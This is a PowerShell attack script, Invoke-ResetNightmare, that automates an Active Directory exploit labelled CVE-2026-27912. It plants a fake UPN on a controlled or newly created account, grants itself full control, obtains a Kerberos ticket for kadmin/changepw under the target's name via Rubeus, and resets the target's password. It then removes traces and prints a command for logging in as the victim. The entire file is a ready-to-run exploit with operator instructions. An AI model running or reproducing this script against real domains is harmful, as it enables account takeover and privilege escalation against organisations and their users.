function Invoke-ResetNightmare {
    <#
    .SYNOPSIS
        Automatically run ResetNightmare (CVE-2026-27912) attack steps,
        resetting a target account's password using a TGT for a user with a fake UPN.
    .DESCRIPTION
        This script will attempt to reset a target account's password by leveraging ResetNightmare.
        The script uses:
        - Rubeus.exe (tested with Rubeus compiled with .NET Framework 4.6.2)
        - The PowerShell ActiveDirectory module
        The script automatically uses the current directory for storing the TGT ticket file, and will delete it after the attack is complete.
    .PARAMETER TargetAccount
        The SamAccountName of the attack's target (the account to reset the password for).
        If targeting a computer account, make sure to use it's SamAccountName (ending with $, e.g. "server$").
    .PARAMETER TargetNewPassword
        The new password to set for TargetAccount.
    .PARAMETER UPNUser
        The account to which the you can write a UPN, or the account to create if -CreateNewPath is specified.
    .PARAMETER UPNUserPassword
        Cleartext password to UPNUser.
    .PARAMETER Computer
        Optional switch. If specified, UPNUser is treated as a computer account.
        If combined with -CreateNewPath, a computer account will be created instead of a user account.
        This has no impact over TargetAccount; both user and computer accounts can be targeted.
    .PARAMETER RubeusPath
        Optional. The path to the Rubeus executable. Default is ".\Rubeus.exe".
    .PARAMETER SupportedEncryption
        Optional. The supported encryption type for the TGT. The default value is "AES256" and should work for most cases.
        If changing this is needed, the supported values are:
        DES|RC4|AES128|AES256
    .PARAMETER CreateNewPath
        Optional.
        DistinguishedName to an OU/Container where you have permissions to create objects.
        If specified, the -UPNUser and -UPNUserPassword parameters will be the credentials of the user to create, instead of using an existing user.
    .PARAMETER DC
        Optional. Name of the DC to operate against. This is automatically resolved if not specified.
    #>
    Param(
        [Parameter(Mandatory=$True)][String]$TargetAccount,
        [Parameter(Mandatory=$True)][String]$TargetNewPassword,
        [Parameter(Mandatory=$True)][String]$UPNUser,
        [Parameter(Mandatory=$True)][String]$UPNUserPassword,
        [Parameter(Mandatory=$False)][Switch]$Computer,
        [Parameter(Mandatory=$False)][String]$RubeusPath=".\Rubeus.exe",
        [Parameter(Mandatory=$False)][String]$SupportedEncryption="AES256",
        [Parameter(Mandatory=$False)][String]$CreateNewPath="",
        [Parameter(Mandatory=$False)][String]$DC
    )
    if (-not (Get-Module -Name ActiveDirectory -ListAvailable)) {
        throw "[*] Please make sure the ActiveDirectory module is installed. Quitting..."
    }

    if (-not (Test-Path $RubeusPath)) {
        throw "[*] Couldn't find Rubeus executable. Provide a valid path in the -RubeusPath parameter."
    }

    if (-not $DC) {
        $DC = (Get-ADDomainController).Name
    }

    $outfile = [System.IO.Path]::Combine($PWD,"TGT.kirbi")
    if (Test-Path $outfile) {
        $choice = Read-Host "Output TGT path $outfile already exists. Delete the file? (y/n)"
        if ($choice -eq "y") {
            Remove-Item -Path $outfile
        }
        else {
            return "Quitting..."
        }
    }

    if ($CreateNewPath) {
        if ($Computer) {
            Write-Host "[*] Creating computer $UPNUser in $CreateNewPath..."
            try {
                $newUserDN = (New-ADComputer -Name $UPNUser -Path $CreateNewPath -PassThru -Server $DC).DistinguishedName
            }
            catch {
                throw "Couldn't create a computer in $CreateNewPath."
            }
        }
        else {        
            Write-Host "[*] Creating user $UPNUser in $CreateNewPath..."
            try {
                $newUserDN = (New-ADUser -Name $UPNUser -Path $CreateNewPath -PassThru -Server $DC).DistinguishedName
            }
            catch {
                throw "Couldn't create a user in $CreateNewPath."
            }
        }
        Write-Host "[*] Getting Full Control rights on $UPNUser for $($env:USERNAME)"
        try {
            New-PSDrive -Name "TargetDC" -PSProvider ActiveDirectory -Server $DC -Root "//RootDSE/" | Out-Null
            $oldACL = Get-Acl "TargetDC:$newUserDN"
            $mySID = [System.Security.Principal.SecurityIdentifier]"$((Get-ADUser $env:USERNAME -Server $DC).SID.Value)"
            $myACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($mySID,"GenericAll","Allow",'None',[Guid]::Empty)
            $oldACL.AddAccessRule($myACE)
            Set-Acl -AclObject $oldACL "TargetDC:$newUserDN"
            Remove-PSDrive -Name "TargetDC"
        }
        catch {
            throw "Couldn't modify permissions on $newUserDN."
        }

        Write-Host "[*] Resetting $UPNUser's password to $UPNUserPassword"
        Set-ADAccountPassword -Identity $newUserDN -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $UPNUserPassword -Force) -Server $DC

        Write-Host "[*] Enabling $UPNUser..."
        if ($Computer) {
            Set-ADComputer $UPNUser -Enabled $true -Server $DC
        }
        else {
            Set-ADUser $UPNUser -Enabled $true -Server $DC
        }
    }

    try {
        $targetSAN = (Get-ADUser $TargetAccount -Server $DC).samaccountname
    }
    catch {
        try {
            $targetSAN = (Get-ADObject -LDAPFilter "samaccountname=$TargetAccount" -Properties SamAccountName -Server $DC).samaccountname
        }
        catch {
            throw "Couldn't find a principal named $TargetAccount."
        }
    }

    try {
        if ($Computer) {
            $uu = Get-ADComputer $UPNUser -Properties UserPrincipalName -Server $DC
        }
        else {
            $uu = Get-ADUser $UPNUser -Properties UserPrincipalName -Server $DC
        }
        if ($uu.UserPrincipalName) {
            $oldUPN = $uu.UserPrincipalName
        }
    }
    catch {
        throw "Couldn't find an account named $UPNUser."
    }

    # Set UPN and verify it's presence
    Write-Host "[*] Setting a fake UPN for $UPNUser..."
    try {
        if ($Computer) {
            Set-ADComputer $UPNUser -UserPrincipalName $targetSAN -Server $DC
        }
        else {
            Set-ADUser $UPNUser -UserPrincipalName $targetSAN -Server $DC
        }
        while (-not (Get-ADObject -LDAPFilter "userprincipalname=$targetSAN" -Server $DC)){
            Start-Sleep -Seconds 1
        }
    }
    catch {
        throw "Failed to set a UPN on $UPNUser. Verify that the running context has the required permissions."
    }

    Write-Host "[*] Asking for a TGT for $UPNUser with the name $targetSAN (NT_ENTERPRISE) for kadmin/changepw..."
    Start-Sleep -Seconds 1
    & $RubeusPath asktgt /user:$targetSAN /password:$UPNUserPassword /principaltype:enterprise /outfile:$outfile /suppenctype:$SupportedEncryption /changepw /dc:$DC | Out-Null
    if (-not (Test-Path $outfile)) {
        throw "[*] failed to get a TGT for $UPNUser with the name $targetSAN (NT_ENTERPRISE)"
    }

    # Clear UPN
    Write-Host "[*] Clearing fake UPN from $UPNUser..."
    if ($Computer) {
        Set-ADComputer $UPNUser -Clear UserPrincipalName -Server $DC
    }
    else {
        Set-ADUser $UPNUser -Clear UserPrincipalName -Server $DC
    }
    while (Get-ADObject -LDAPFilter "userprincipalname=$targetSAN" -Server $DC){
        Start-Sleep -Seconds 1
    }

    Start-Sleep -Seconds 1
    Write-Host "[*] Attempting to change $targetSAN's password to $TargetNewPassword..."
    $changepw = & $RubeusPath changepw /ticket:$outfile /new:$TargetNewPassword /dc:$DC
    if (($changepw.split([Environment]::NewLine) | select -Last 1) -ne "[+] Password change success!" -and ($changepw.split([Environment]::NewLine) | select -Last 2 | select -First 1) -notmatch "KDC_ERR_NONE") {
        Write-Host "Something went wrong. changepw output:`n$($changepw -join [Environment]::NewLine)"
        return
    }

    # Attack should have succeeded, cleaning up
    Write-Host "[*] Cleaning up files..."
    try {
        Remove-Item -Path $outfile
    }
    catch {
        "[*] Warning: couldn't delete file $outfile"
    }
    if ($oldUPN) {
        Write-Host "[*] Restoring original UPN value..."
        if ($Computer) {
            Set-ADComputer $UPNUser -UserPrincipalName $oldUPN -Server $DC
        }
        else {
            Set-ADUser $UPNUser -UserPrincipalName $oldUPN -Server $DC
        }

        while (-not (Get-ADObject -LDAPFilter "userprincipalname=$oldUPN" -Server $DC)){
            Start-Sleep -Seconds 1
        }
    }
    $command = "Rubeus.exe asktgt /user:$targetSAN /password:$TargetNewPassword /suppenctype:$SupportedEncryption /nowrap /createnetonly:cmd.exe /show"
    Write-Host
    Write-Host "Success! You can now authenticate as $targetSAN with the password $TargetNewPassword"
    Write-Host "To spawn a new netonly process:"
    Write-Host $command
}